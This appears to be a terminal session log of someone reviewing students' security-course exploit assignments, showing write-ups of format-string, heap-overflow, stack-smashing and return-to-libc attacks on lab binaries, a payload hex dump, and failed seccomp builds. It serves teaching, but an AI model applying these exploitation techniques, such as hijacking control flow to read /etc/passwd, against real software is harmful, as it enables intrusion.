/usr/src/linux-headers-4.4.0-130-generic/include/config/message/loglevel/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/mtrr/sanitizer/enable/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/mtrr/sanitizer/spare/reg/nr/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/nls/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/nouveau/debug/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/pcieaspm/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/security/apparmor/hash/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/snd/ac97/power/save/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/snd/hda/power/save/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/snd/seq/hrtimer/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/tahvo/usb/host/by/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/wq/power/efficient/default.h
/usr/src/linux-headers-4.4.0-133/arch/hexagon/include/asm/vm_fault.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/doublefault.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/arch/sparsemem/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/calgary/iommu/enabled/by/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/crypto/rng/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/hpet/mmap/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/mac80211/rc/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/message/loglevel/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/mtrr/sanitizer/enable/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/mtrr/sanitizer/spare/reg/nr/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/nls/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/nouveau/debug/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/pcieaspm/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/security/apparmor/hash/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/snd/ac97/power/save/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/snd/hda/power/save/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/snd/seq/hrtimer/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/tahvo/usb/host/by/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/wq/power/efficient/default.h
/usr/src/linux-headers-4.4.0-134/arch/hexagon/include/asm/vm_fault.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/doublefault.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/arch/sparsemem/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/calgary/iommu/enabled/by/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/crypto/rng/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/hpet/mmap/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/mac80211/rc/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/message/loglevel/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/mtrr/sanitizer/enable/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/mtrr/sanitizer/spare/reg/nr/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/nls/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/nouveau/debug/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/pcieaspm/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/security/apparmor/hash/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/snd/ac97/power/save/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/snd/hda/power/save/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/snd/seq/hrtimer/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/tahvo/usb/host/by/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/wq/power/efficient/default.h
/usr/src/linux-headers-4.4.0-137/arch/hexagon/include/asm/vm_fault.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/doublefault.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/arch/sparsemem/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/calgary/iommu/enabled/by/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/crypto/rng/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/hpet/mmap/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/mac80211/rc/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/message/loglevel/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/mtrr/sanitizer/enable/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/mtrr/sanitizer/spare/reg/nr/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/nls/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/nouveau/debug/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/pcieaspm/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/security/apparmor/hash/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/snd/ac97/power/save/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/snd/hda/power/save/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/snd/seq/hrtimer/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/tahvo/usb/host/by/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/wq/power/efficient/default.h
/usr/src/linux-headers-4.4.0-138/arch/hexagon/include/asm/vm_fault.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/doublefault.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/arch/sparsemem/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/calgary/iommu/enabled/by/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/crypto/rng/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/hpet/mmap/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/mac80211/rc/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/message/loglevel/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/mtrr/sanitizer/enable/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/mtrr/sanitizer/spare/reg/nr/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/nls/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/nouveau/debug/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/pcieaspm/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/security/apparmor/hash/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/snd/ac97/power/save/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/snd/hda/power/save/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/snd/seq/hrtimer/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/tahvo/usb/host/by/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/wq/power/efficient/default.h
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ locate fault.h | grep -v default.h
/usr/src/linux-headers-4.4.0-130/arch/hexagon/include/asm/vm_fault.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/doublefault.h
/usr/src/linux-headers-4.4.0-133/arch/hexagon/include/asm/vm_fault.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/doublefault.h
/usr/src/linux-headers-4.4.0-134/arch/hexagon/include/asm/vm_fault.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/doublefault.h
/usr/src/linux-headers-4.4.0-137/arch/hexagon/include/asm/vm_fault.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/doublefault.h
/usr/src/linux-headers-4.4.0-138/arch/hexagon/include/asm/vm_fault.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/doublefault.h
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ls
malicious_input1.py   malicious_input3.py   task1.txt  vuln_prog1.bin  vuln_prog3.bin
malicious_input1.txt  malicious_input3.txt  task2.txt  vuln_prog1.c    vuln_prog3.c
malicious_input2.py   malicious_input4.py   task3.txt  vuln_prog2.bin  vuln_prog4.bin
malicious_input2.txt  malicious_input4.txt  task4.txt  vuln_prog2.c    vuln_prog4.c
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ vim malicious_input1.py 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ls
malicious_input1.py   malicious_input3.py   task1.txt  vuln_prog1.bin  vuln_prog3.bin
malicious_input1.txt  malicious_input3.txt  task2.txt  vuln_prog1.c    vuln_prog3.c
malicious_input2.py   malicious_input4.py   task3.txt  vuln_prog2.bin  vuln_prog4.bin
malicious_input2.txt  malicious_input4.txt  task4.txt  vuln_prog2.c    vuln_prog4.c
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ cp malicious_input1.txt 
cp: missing destination file operand after 'malicious_input1.txt'
Try 'cp --help' for more information.
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ cp malicious_input1.txt malicious_input1-c.txt
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ../../team3/hw2-more_attacks/vuln_prog1.bin 104 < malicious_input1-c.txt 
Which music you want to play:

You want to play:
Segmentation fault (core dumped)
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ vim malicious_input1-c.txt 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ../../team3/hw2-more_attacks/vuln_prog1.bin 104 < malicious_input1-c.txt 
Which music you want to play:

You want to play:
AAAAAAAAAAAAAAAAAAAAAAAAAA(nil)
Stack at 0x7ffdbf167dc0

Instead
Playing Perfect
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ../../team3/hw2-more_attacks/vuln_prog1.bin 123 < malicious_input1-c.txt 
Which music you want to play:

You want to play:
AAAAAAAAAAAAAAAAAAAAAAAAAA0x1ec
Stack at 0x7ffd17a10dd0

Instead
Playing Perfect
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ls
malicious_input1-c.txt  malicious_input2.txt  malicious_input4.txt  task4.txt       vuln_prog2.c    vuln_prog4.c
malicious_input1.py     malicious_input3.py   task1.txt             vuln_prog1.bin  vuln_prog3.bin
malicious_input1.txt    malicious_input3.txt  task2.txt             vuln_prog1.c    vuln_prog3.c
malicious_input2.py     malicious_input4.py   task3.txt             vuln_prog2.bin  vuln_prog4.bin
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ cat task*
We first disassembled the play_music function to find the memory location of song. This was the address we needed to change to be equal to 26. Next we started writing the attack. We started by writing 26 A's, as this is how we would get the value 26. We then after that used %p to view the stack, and went back through it with $ and a number, which we incremented. When we got out of all of the A's, this is where we finished the attack. We first added in the address of song we had found earlier to the end of our input, as this is the address that should be attacked. We then changed %p to %n, because this takes the number of bytes written earlier (26), and places it to the argument after it (the address of song).  
The first step was to figure out how big the heap was. By looking at the disassembly of the function, we determined the heap to be 64 bytes long. The next step was to change the values of the two variables. They were stored directly after the heap, so by tailoring our input we could do this. The value stored first was tragic. We were able to add on the correct hex value after the heap to get that one to work. As it was a long, we had to add in extra null bytes after it to pad the distance we had to go to get to magic. This was 1 null byte for the number so no more bits were added, then 4 more null bytes after to fill up the long. We then did the same task of adding the write hex value and the null byte, and then it worked.
In this task, I determined the buffer to be 264 characters big. Using this info, I found the address of the system call and exit call, and along with the addresses of the /bin/cat and /etc/passwd that I exported into the environment, I overflowed the buffer and passed these addresses next, which used cat to print out the passwd file.
To start off this ask, I examined the source code and found the size of the buffer to be 16. Using this information, I determined that to overflow the BSS and heap, I'd have to pass 16 characters first/ Then, I saw that the value I needed to pass to accept the case would be 1337, so I converted the number to hexadecimal and added it to the end of the 16 A's. We ran into the issue that the program was taking out input as a string and not a hex value, and we were not able to get it to work becasue it was not possible for us to type the value associated to the hex value of 5
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ cd ../../../assignment1/team3/hw1-stack_smashing/
ryadav3@nemo:~/576/assigns/assignment1/team3/hw1-stack_smashing$ ls
malicious_input1.py   malicious_input2.py   shellcode  task2.txt       vuln_prog1.c
malicious_input1.txt  malicious_input2.txt  task1.txt  vuln_prog1.bin  vuln_prog2.bin
ryadav3@nemo:~/576/assigns/assignment1/team3/hw1-stack_smashing$ cat task1.txt 
The first step was to run the program with an input that would cause it to seg fault. We found that at around 100 bytes it would. We then looked at the code and got the names of the functions, and set breakpoints at main and complex verify. After we started the program again, we disasembled complex_verify, as this was the function that called strcpy(). we then set breakpoints before it was called and after it was called, so we could see how much we were overwriting the rsp and rbp. Through testing we were able to see that we needed 88 A's to get to the return address. We then disasembled party() and got the memory address of where it started. From there we added the bytes of the memory address in reverse to the string of A's and it worked.
ryadav3@nemo:~/576/assigns/assignment1/team3/hw1-stack_smashing$ cat task2.txt 
This exploit was similar to the first. We first set a breakpoint in main then run and disassemble both main and complex_verify. We then set a breakpoint before and after the scanf to see where we're overwriting to. Next we keep adding A's until we see the rbp get overflowed. We then disas party and find the address that it starts at. Because party has some memory addresses that include characters that stop scanf, we had to save the memory address of the 4th or 5th instruction and put that at the end of the A's. This then ran and got to party then seg faulted on the printf in party.
ryadav3@nemo:~/576/assigns/assignment1/team3/hw1-stack_smashing$ cd ../../../assignment2/team3/hw2-more_attacks/
ryadav3@nemo:~/576/assigns/assignment2/team3/hw2-more_attacks$ ls
malicious_input1.py   malicious_input3.py   malicious_input5.py   task3.txt       vuln_prog1.c    vuln_prog3.c
malicious_input1.txt  malicious_input3.txt  malicious_input5.txt  task4.txt       vuln_prog2.bin  vuln_prog4.bin
malicious_input2.py   malicious_input4.py   task1.txt             task5.txt       vuln_prog2.c    vuln_prog4.c
malicious_input2.txt  malicious_input4.txt  task2.txt             vuln_prog1.bin  vuln_prog3.bin
ryadav3@nemo:~/576/assigns/assignment2/team3/hw2-more_attacks$ cat task*
For all parts of this assignment:
1. Created on Nemo
2. Used student ID 10408551


For this one, it took us a lot of experimenting to come up with the final solution.

We figured out that we were going to need to use %n to write over the song variable, which is in the bss
As such, we needed to include the address of that variable that is in the bss in our format string, to 
act as the argument for %n. In addition, we needed to set that variable to be 26, so we needed to write 26 characters.

We then tried just referencing the 5th argument, assuming that it would be our address, but realized that was wrong, as
the arguments start from the bottom of the stack.

Using the 'Stack At' print out, we were able to see where the bottom of the stack was, and we used the disasembly to find
where our format string was stored. We calculated this offset, and divided by 8, which gave us 66. This meant that there are
66 arguements between the rsp and start of our format string. 

Upon investigating, we saw that the first 5 arguments of printf are passed in registers, NOT on the stack. As such, we needed to add 5 to 66, telling us that there were 71 arguments before our format string, and so the format string itself is the 72nd argument. 

We then just needed to add 4 to 72 to bring us to the part of the format string that holds our address.

Thus, our %n was modified to %76$n, to write to the 76th argument, which is the address of song. 
For this exploit, we needed to overwrite spots in the heap.

The assembly code was analyzed to find out at what address in the stack the pointers were stored, 
and what the pointers actually were

Buff-Size  --> Stored at -0x8(%rbp), with value 0x7c, or value of 124 base 10
Buffer --> stored at ...e8f0, with the value of the pointer being 60201 in the heap
tragic --> stored at ...e8e8, with the value of the pointer being 6020a0 in the heap
magic -->  stored at e8e0, with the value of the pointer being 6020c0.

From these values, we determined what values needed to be put in the heap
36 groups of 4 bytes (to get to tragic)
5DE padded with zeros to 8 bytes, followed by 7 groups of 8 zeros (to get to magic)
2279F padded with zeros to 8 bytes

These were then combined to get our payload

TASK3.txt

In order to do this, we decided to use execl in order to execute /bin/cat. We used "p execl" to find the address in the code. We then structured our payload as follows:

[Buffer][Extra to get to saved return][execl address][fake return][arg2][arg2][arg1]

The arguments were stored in buffer, so it was '/bin/cat' followed by '/etc/passwd', to pass into execl. execl expects the arg2 to be the name of the executed file, and arg1 to be the name of the file to cat, so the locations of these were found by examining the esp. The extra was found by locating the original return address.
Using this, we then were able to build the payload and execute it.
For this task, the following were performed:

1. Run the binary in gdb, and set a breakpoint on main
2. Look at the dissasembly, and see the address of buf and magic
3. Observe they have an offset of 16 bytes
4. Payload therefore is 16 bytes (16 'A's followed by the number 1337 in hex, or \x39\x05, followed by \x00's)
# TASK5.txt
Our ID for this was 10408551

We solved this problem again by overwriting the return address of play_music using the address of the start of play_eminem.We did this by instead having printf print a huge quantity of a long (namely 4196247 characters). We then had it write this in the return address. This number is just the address of play_eminem in decimal. So our format string looked as follows:
'%04196247ld%74$n[return address location]'
This put our return address in place of the location in main.
We got the $74 by the same method as in task1, where we used the location of the format string, in particular the offset of the return address in the format string.
ryadav3@nemo:~/576/assigns/assignment2/team3/hw2-more_attacks$ cd ../../team5/hw2-more_attacks/
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ cat task*
We first disassembled the play_music function to find the memory location of song. This was the address we needed to change to be equal to 26. Next we started writing the attack. We started by writing 26 A's, as this is how we would get the value 26. We then after that used %p to view the stack, and went back through it with $ and a number, which we incremented. When we got out of all of the A's, this is where we finished the attack. We first added in the address of song we had found earlier to the end of our input, as this is the address that should be attacked. We then changed %p to %n, because this takes the number of bytes written earlier (26), and places it to the argument after it (the address of song).  
The first step was to figure out how big the heap was. By looking at the disassembly of the function, we determined the heap to be 64 bytes long. The next step was to change the values of the two variables. They were stored directly after the heap, so by tailoring our input we could do this. The value stored first was tragic. We were able to add on the correct hex value after the heap to get that one to work. As it was a long, we had to add in extra null bytes after it to pad the distance we had to go to get to magic. This was 1 null byte for the number so no more bits were added, then 4 more null bytes after to fill up the long. We then did the same task of adding the write hex value and the null byte, and then it worked.
In this task, I determined the buffer to be 264 characters big. Using this info, I found the address of the system call and exit call, and along with the addresses of the /bin/cat and /etc/passwd that I exported into the environment, I overflowed the buffer and passed these addresses next, which used cat to print out the passwd file.
To start off this ask, I examined the source code and found the size of the buffer to be 16. Using this information, I determined that to overflow the BSS and heap, I'd have to pass 16 characters first/ Then, I saw that the value I needed to pass to accept the case would be 1337, so I converted the number to hexadecimal and added it to the end of the 16 A's. We ran into the issue that the program was taking out input as a string and not a hex value, and we were not able to get it to work becasue it was not possible for us to type the value associated to the hex value of 5
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ../../team3/hw2-more_attacks/vuln_prog1.bin 24270 < malicious_input1-c.txt 
Which music you want to play:

You want to play:
AAAAAAAAAAAAAAAAAAAAAAAAAA0x100000000
Stack at 0x7ffda7cb2ae0

Instead
Playing Perfect
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ../../team3/hw2-more_attacks/vuln_prog1.bin 24313 < malicious_input1-c.txt 
Which music you want to play:

You want to play:
AAAAAAAAAAAAAAAAAAAAAAAAAA0x46474e550
Stack at 0x7ffd46952420

Instead
Playing Perfect
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ls
malicious_input1-c.txt  malicious_input2.txt  malicious_input4.txt  task4.txt       vuln_prog2.c    vuln_prog4.c
malicious_input1.py     malicious_input3.py   task1.txt             vuln_prog1.bin  vuln_prog3.bin
malicious_input1.txt    malicious_input3.txt  task2.txt             vuln_prog1.c    vuln_prog3.c
malicious_input2.py     malicious_input4.py   task3.txt             vuln_prog2.bin  vuln_prog4.bin
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ cd ../..
ryadav3@nemo:~/576/assigns/assignment2$ cd team6/
ryadav3@nemo:~/576/assigns/assignment2/team6$ tar -xzvf hw26_late_24124_4248207_ajin_elew_hw2-3.tgz 
hw2-more_attacks/
hw2-more_attacks/malicious_input1.sh
hw2-more_attacks/malicious_input1.txt
hw2-more_attacks/malicious_input1_aj.sh
hw2-more_attacks/malicious_input1_aj.txt
hw2-more_attacks/malicious_input2.sh
hw2-more_attacks/malicious_input2.txt
hw2-more_attacks/malicious_input3.sh
hw2-more_attacks/malicious_input3.txt
hw2-more_attacks/malicious_input4.sh
hw2-more_attacks/malicious_input4.txt
hw2-more_attacks/note1
hw2-more_attacks/note2
hw2-more_attacks/note3
hw2-more_attacks/Task 1.pdf
hw2-more_attacks/task1.txt
hw2-more_attacks/task2.txt
hw2-more_attacks/task3.txt
hw2-more_attacks/task4.txt
hw2-more_attacks/vuln_prog1.bin
hw2-more_attacks/vuln_prog1.c
hw2-more_attacks/vuln_prog2.bin
hw2-more_attacks/vuln_prog2.c
hw2-more_attacks/vuln_prog3.bin
hw2-more_attacks/vuln_prog3.c
hw2-more_attacks/vuln_prog4.bin
hw2-more_attacks/vuln_prog4.c
ryadav3@nemo:~/576/assigns/assignment2/team6$ cd hw2-more_attacks/
ryadav3@nemo:~/576/assigns/assignment2/team6/hw2-more_attacks$ ls
malicious_input1_aj.sh   malicious_input2.txt  note1       task2.txt       vuln_prog2.bin  vuln_prog4.c
malicious_input1_aj.txt  malicious_input3.sh   note2       task3.txt       vuln_prog2.c
malicious_input1.sh      malicious_input3.txt  note3       task4.txt       vuln_prog3.bin
malicious_input1.txt     malicious_input4.sh   Task 1.pdf  vuln_prog1.bin  vuln_prog3.c
malicious_input2.sh      malicious_input4.txt  task1.txt   vuln_prog1.c    vuln_prog4.bin
ryadav3@nemo:~/576/assigns/assignment2/team6/hw2-more_attacks$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team6/hw2-more_attacks$ vim malicious_input1.sh 
ryadav3@nemo:~/576/assigns/assignment2/team6/hw2-more_attacks$ vim malicious_input1_aj.sh 
ryadav3@nemo:~/576/assigns/assignment2/team6/hw2-more_attacks$ ls -l
total 173
-rwxr-x---+ 1 ryadav3 student    291 Oct 29 21:02 malicious_input1_aj.sh
-rwxr-x---+ 1 ryadav3 student     52 Oct 29 20:50 malicious_input1_aj.txt
-rwxr-x---+ 1 ryadav3 student    168 Oct 29 21:02 malicious_input1.sh
-rwxr-x---+ 1 ryadav3 student     33 Oct 29 20:36 malicious_input1.txt
-rwxr-x---+ 1 ryadav3 student    282 Oct 28 04:18 malicious_input2.sh
-rwxr-x---+ 1 ryadav3 student    164 Oct 27 23:18 malicious_input2.txt
-rwxr-x---+ 1 ryadav3 student   1046 Oct 29 20:08 malicious_input3.sh
-rwxr-x---+ 1 ryadav3 student    276 Oct 29 20:11 malicious_input3.txt
-rwxr-x---+ 1 ryadav3 student    128 Oct 27 23:41 malicious_input4.sh
-rwxr-x---+ 1 ryadav3 student     20 Oct 27 23:41 malicious_input4.txt
-rwxr-x---+ 1 ryadav3 student   3035 Oct 26 14:52 note1
-rwxr-x---+ 1 ryadav3 student   4223 Oct 27 23:38 note2
-rwxr-x---+ 1 ryadav3 student   1060 Oct 29 14:53 note3
-rwxr-x---+ 1 ryadav3 student 106823 Oct 29 21:04 Task 1.pdf
-rwxr-x---+ 1 ryadav3 student    415 Oct 29 21:04 task1.txt
-rwxr-x---+ 1 ryadav3 student    642 Oct 29 21:01 task2.txt
-rwxr-x---+ 1 ryadav3 student    367 Oct 29 20:39 task3.txt
-rwxr-x---+ 1 ryadav3 student     80 Oct 29 19:30 task4.txt
-rwxr-x---+ 1 ryadav3 student   9160 Oct 12 23:32 vuln_prog1.bin
-rwxr-x---+ 1 ryadav3 student    857 Oct 29 14:02 vuln_prog1.c
-rwxr-x---+ 1 ryadav3 student   9088 Oct 13 00:24 vuln_prog2.bin
-rwxr-x---+ 1 ryadav3 student    809 Oct 29 19:14 vuln_prog2.c
-rwxr-x---+ 1 ryadav3 student   7492 Oct 13 01:16 vuln_prog3.bin
-rwxr-x---+ 1 ryadav3 student    345 Oct 29 20:00 vuln_prog3.c
-rwxr-x---+ 1 ryadav3 student   8904 Oct 16 13:40 vuln_prog4.bin
-rwxr-x---+ 1 ryadav3 student    447 Oct 27 23:39 vuln_prog4.c
ryadav3@nemo:~/576/assigns/assignment2/team6/hw2-more_attacks$ ./vuln_prog1.bin 10414350 < malicious_input1.txt 
Which music you want to play:

You want to play:
AAAAAAAAAAAAAAAAAAAAAAAAAA%88?`
Stack at 0x7ffe310af170

Instead
Playing Perfect
ryadav3@nemo:~/576/assigns/assignment2/team6/hw2-more_attacks$ ./vuln_prog1.bin 10414350 < malicious_input1_aj.txt 
Which music you want to play:

You want to play:
AAAAAAAAAAAAAAAAAAAAAAAAAA%87?`
Stack at 0x7fff2dce3130

Instead
Playing Perfect
ryadav3@nemo:~/576/assigns/assignment2/team6/hw2-more_attacks$ vim malicious_input1.sh 
ryadav3@nemo:~/576/assigns/assignment2/team6/hw2-more_attacks$ xxd malicious_input1.txt 
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 2538 38ac 1060  AAAAAAAAAA%88..`
00000020: 00                                       .
ryadav3@nemo:~/576/assigns/assignment2/team6/hw2-more_attacks$ file note
note: cannot open `note' (No such file or directory)
ryadav3@nemo:~/576/assigns/assignment2/team6/hw2-more_attacks$ file note
note1  note2  note3  
ryadav3@nemo:~/576/assigns/assignment2/team6/hw2-more_attacks$ file note1 
note1: ASCII text
ryadav3@nemo:~/576/assigns/assignment2/team6/hw2-more_attacks$ vim note1 
ryadav3@nemo:~/576/assigns/assignment2/team6/hw2-more_attacks$ less Task\ 1.pdf 
ryadav3@nemo:~/576/assigns/assignment2/team6/hw2-more_attacks$ 
ryadav3@nemo:~/576/assigns/assignment2/team6/hw2-more_attacks$ kill -9 $$
Connection to nemo.srcit.stevens-tech.edu closed.
Lunarantic:576 Lunarantic$ 
Lunarantic:576 Lunarantic$ 
Lunarantic:576 Lunarantic$ 
Lunarantic:576 Lunarantic$ ssh ryadav3@nemo.srcit.stevens-tech.edu
ryadav3@nemo.srcit.stevens-tech.edu's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-134-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

38 packages can be updated.
0 updates are security updates.

New release '18.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


*** System restart required ***
Last login: Tue Oct 30 16:59:29 2018 from 155.246.203.206
ryadav3@nemo:~$ cd 576/labs/lab9/
ryadav3@nemo:~/576/labs/lab9$ ls
sec  vul
ryadav3@nemo:~/576/labs/lab9$ cd vul/
ryadav3@nemo:~/576/labs/lab9/vul$ ls
Makefile  payload  payload.py  sec_prog10.c  sec_prog1.c  vuln_prog  vuln_prog1.c
ryadav3@nemo:~/576/labs/lab9/vul$ vim vuln_prog1.c 
ryadav3@nemo:~/576/labs/lab9/vul$ vim sec_prog1.c 
ryadav3@nemo:~/576/labs/lab9/vul$ 
ryadav3@nemo:~/576/labs/lab9/vul$ vim sec_prog10.c 
ryadav3@nemo:~/576/labs/lab9/vul$ make
gcc /lib/x86_64-linux-gnu/libseccomp.so.2 -fno-stack-protector -z execstack -fomit-frame-pointer -O0 -o sec_prog sec_prog1.c
sec_prog1.c: In function ‘main’:
sec_prog1.c:47:8: warning: implicit declaration of function ‘seccomp_init’ [-Wimplicit-function-declaration]
  ctx = seccomp_init(SCMP_ACT_KILL);
        ^
sec_prog1.c:47:21: error: ‘SCMP_ACT_KILL’ undeclared (first use in this function)
  ctx = seccomp_init(SCMP_ACT_KILL);
                     ^
sec_prog1.c:47:21: note: each undeclared identifier is reported only once for each function it appears in
sec_prog1.c:49:2: warning: implicit declaration of function ‘seccomp_rule_add’ [-Wimplicit-function-declaration]
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
  ^
sec_prog1.c:49:24: error: ‘SCMP_ACT_ALLOW’ undeclared (first use in this function)
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
                        ^
sec_prog1.c:49:40: warning: implicit declaration of function ‘SCMP_SYS’ [-Wimplicit-function-declaration]
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
                                        ^
sec_prog1.c:53:2: warning: implicit declaration of function ‘seccomp_load’ [-Wimplicit-function-declaration]
  seccomp_load(ctx);
  ^
Makefile:11: recipe for target 'sec_prog' failed
make: *** [sec_prog] Error 1
ryadav3@nemo:~/576/labs/lab9/vul$ gcc -fno-stack-protector -z execstack -fomit-frame-pointer -O0 -o sec_prog sec_prog1.c
sec_prog1.c: In function ‘main’:
sec_prog1.c:47:8: warning: implicit declaration of function ‘seccomp_init’ [-Wimplicit-function-declaration]
  ctx = seccomp_init(SCMP_ACT_KILL);
        ^
sec_prog1.c:47:21: error: ‘SCMP_ACT_KILL’ undeclared (first use in this function)
  ctx = seccomp_init(SCMP_ACT_KILL);
                     ^
sec_prog1.c:47:21: note: each undeclared identifier is reported only once for each function it appears in
sec_prog1.c:49:2: warning: implicit declaration of function ‘seccomp_rule_add’ [-Wimplicit-function-declaration]
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
  ^
sec_prog1.c:49:24: error: ‘SCMP_ACT_ALLOW’ undeclared (first use in this function)
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
                        ^
sec_prog1.c:49:40: warning: implicit declaration of function ‘SCMP_SYS’ [-Wimplicit-function-declaration]
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
                                        ^
